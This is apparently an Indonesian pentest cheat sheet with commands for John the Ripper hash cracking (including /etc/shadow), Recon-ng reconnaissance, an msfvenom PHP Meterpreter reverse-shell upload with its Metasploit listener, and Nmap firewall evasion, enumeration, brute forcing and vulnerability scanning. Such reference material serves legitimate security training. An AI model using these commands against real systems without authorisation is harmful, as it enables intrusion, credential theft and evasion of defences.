# Trik & Tips Forensic
> Disusun oleh Hardiyanto

### Daftar Isi
* [John the Ripper](#john-the-ripper)
* [Recon-ng](#reconng)
* [Msfvenom & Msfconsole](#msfvenom-msfconsole)
* [Nmap](#nmap)
    * [Firewall Evasion (Decoys,MTU & Fragmentation)](#firewall-evasion-decoys-mtu-fragmentation)
    * [Scan Timing Performance](#scan-timing-performance)
    * [Nmap Scripting Engine (NSE)](#nmap-scripting-engine-nse)
    * [Banner Grabbing](#banner-grabbing)
    * [FTP Enumeration](#ftp-enumeration)
    * [DNS Enumeration](#dns-enumeration)
    * [SMTP Enumeration](#smtp-enumeration)
    * [HTTP Enumeration - Detecting HTTP Methods](#http-enumeration-detecting-http-methods)
    * [HTTP Enumeration - Finding Hidden Files and Directories](#http-enumeration-finding-hidden-files-and-directories)
    * [HTTP Enumeration - WAF Detection and Fingerprinting](#http-enumeration-waf-detection-and-fingerprinting)
    * [SMB Enumeration](#smb-enumeration)
    * [MySQL Enumeration](#mysql-enumeration)
    * [Vulnerability Scanning With Nmap](#vulnerability-scanning-with-nmap)
    * [Scan for network vulnerabilities](#scan-for-network-vulnerabilities)
    * [Operating System Detection](#operating-system-detection)


#### John the Ripper

```
$ zip2john test.zip
```
```
$ zip2john test.zip > hash.txt
```
```
$ john -format:zip hash.txt
```
```
$ john hash.txt
```
```
john /etc/shadow
```

#### Recon-ng

Recon-Web

Required
```
$ pip install flask
$ pip install dicttoxml
$ pip install unicodecsv
$ pip install xlsxwriter
```

```
marketplace install all
```

Lihat daftar list
```
keys list
```

Menambahkan api
```
keys add shodan_api YOUR_API
```

Menambahkan workspace
```
workspaces create tes
```

Cek Daftar workspace
```
workspaces list
```

Pindah workspace 
```
workspaces load NAMA_WORKSPACE
```

Menambahkan domain
```
db insert domains
```

Melihat daftar domain
```
show domains
```

Melihat Daftar Module
```
modules search
```

Install Module
```
marketplace install NAMA_MODULE
```

Load module
```
modules load NAMA_MODULE
```
Module Shodan
```
 recon/locations-pushpins/shodan
```

Module host
```
recon/hosts-hosts/resolve 
recon/hosts-hosts/ipstack
```
Module domains-contacts
```
recon/domains-contacts/whois_pocs
recon/domains-contacts/pgp_search
```
Module domains-hosts
```
recon/domains-hosts/bing_domain_web 
recon/domains-hosts/brute_hosts
```
Module Interesting
```
discovery/info_disclosure/interesting_files
```

Module Web
```
recon/domains-hosts/builtwith
recon/domains-hosts/google_site_web 
```

Record
```
script record PATH
```
```
script record stop
```
Menjalankan Record
```
$ ./recon-ng -r PATH
```
Menyimpan output menggunakan spool
```
spool start
```
```
spool stop
```

#### Msfvenom & Msfconsole

File Upload
```
$ msfvenom -p php/meterpreter/reverse_tcp lhost=IP lport=4444 raw
```
Masuk Msfconsole
```
$ msfconsole
```
```
use exploit/multi/handler
```
```
set payload php/meterpreter/reverse_tcp
```
```
set lhost IP
```
```
set lport 4444
```
```
exploit
```

Masuk Browser jalankan file php yg berhasil di upload tadi di URL

### Nmap

#### Firewall Evasion (Decoys,MTU & Fragmentation)
```
nmap -sS -sV -F -D RND:3 nmap.scanme.org
```
```
nmap -sS -sV -F -f -D 127.0.0.1 nmap.scanme.org
```
```
nmap -sS -sV -F -f --send-eth -D 127.0.0.1 nmap.scanme.org
```
```
nmap -sS -sV -F --mtu 16,24,32 -D 127.0.0.1 nmap.scanme.org
```
```
nmap -sS -sV -F --mtu 16 --send-eth -D 127.0.0.1 nmap.scanme.org
```

#### Scan Timing Performance
scan timing
```
nmap -sS -p21-80 -T1 nmap.scanme.org
```
```
nmap -Pn -sS -p21-80 -T1 nmap.scanme.org
```
parallelism
```
nmap -sS -p21-433 --min-parallelism 10 nmap.scanme.org
```
```
nmap -sS -p21-433 --max-parallelism 1 nmap.scanme.org
```
host group sizes
```
nmap -sS -F --min-hostgroup 30 127.0.0.1/24
```
```
nmap -sS -F --max-hostgroup 5 127.0.0.1/24
```
host timeout
```
nmap -Pn -p- 127.0.0.1 --host-timeout 30s
```
scan delay
```
nmap -sT --scan-delay 5s nmap.scanme.org
```
packet rate
```
nmap -sT --min-rate 20 nmap.scanme.org
```
```
nmap -sT --max-rate 2 nmap.scanme.org
```

#### Nmap Scripting Engine (NSE)
```
ls -al /usr/share/nmap/scripts/
```
```
ls -al /usr/share/nmap/scripts/ | grep -e "http"
```
```
sudo nmap --script-updatedb
```
```
nmap -p 21 --script ftp-anon 127.0.0.1
```
```
nmap -p 21 --script ftp-anon,ftp-vsftpd-backdoor 127.0.0.1
```
```
nmap -p 21 --script "ftp-*" 127.0.0.1
```

#### Banner Grabbing
```
sudo nmap -p22,80 --script banner 127.0.0.1
```
```
sudo nmap -F -T4 --script banner 127.0.0.1
```

#### FTP Enumeration
```
sudo nmap -sS --script ftp-anon,stp-syst,tftp-enum,ftp-vsftpd-backdoor 127.0.0.1
```

#### DNS Enumeration
```
sudo nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=zonetransfer.me -p 53 -Pn $(dig +short zonetransfer.me NS | head -1)
```
```
sudo nmap --script dns-zone-transfer --script-args dns-zone-transfer.server=nsztml.digi.ninja.dns-zone-transfer.port=53,dns-zone-transfer.domain=zonatransfer.me
```
```
sudo nmap -Pn --script dns-brute --script-args dns-brute.threads=5,dns-brute.hostlist=/usr/share/wordlist/Seclists/Discovery/DNS/fierce-hostlist.txt zonatransfer.me
```

#### SMTP Enumeration
```
sudo nmap -p25 --script smtp-commands 127.0.0.1
```
```
sudo nmap -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} 127.0.0.1
```
```
nmap -p25 --script smtp-open-relay 127.0.0.1 
```
```
sudo nmap -p25 --script smtp-vuln-cve2011-1720 127.0.0.1
```

#### HTTP Enumeration - Detecting HTTP Methods
```
sudo nmap -Pn -sV -p 80 -T4 --script http-methods --script-args http-methods.test=all nmap.scanme.org
```

#### HTTP Enumeration -Finding Hidden Files and Directories
```
sudo nmap -sV -p 80 --script http-enum 127.0.0.1
```

#### HTTP Enumeration - WAF Detection and Fingerprinting
```
sudo nmap -Pn -p 80 --script http-waf-detect 127.0.0.1
```
```
sudo nmap -Pn -p 80 --script http-waf-detect,http-waf-figerprint 127.0.0.1
```

#### SMB Enumeration
```
sudo nmap -p 445 -script smb-os-discovery 127.0.0.1
```
```
sudo nmap -p 445 -script smb-enum-shares 127.0.0.1
```
```
sudo nmap -p 445 -script smb-enum-users 127.0.0.1 -d
```
```
sudo nmap -p 445 -script smb-protokols 127.0.0.1
```
```
sudo nmap -p 445 -script smb-double-pulsar-backdoor 127.0.0.1
```
```
sudo nmap -p 445 -script smb-vuln-ms17-010 127.0.0.1
```

#### MySQL Enumeration
```
nmap -p 3306 --script mysql-info 127.0.0.1
```
```
nmap -p 3306 --script mysql-enum 127.0.0.1
```
```
sudo nmap -p 3306 --script mysql-empty-password 127.0.0.1
```
```
nmap -T4 -p 3306 --script mysql-brute --script-args mysql-brute.threads=100 127.0.0.1
```

#### Vulnerability Scanning With Nmap
```
sudo nmap -sV -p21-8080 --script vulners 127.0.0.1
```

#### Scan for network vulnerabilities
```
sudo nmap --script nmap-vulners -sV 192.168.x.x
```

#### Operating System Detection
```
sudo nmap -O 127.0.0.1
```
```
sudo nmap -O --osscan-guess 127.0.0.1
```
### Terima Kasih


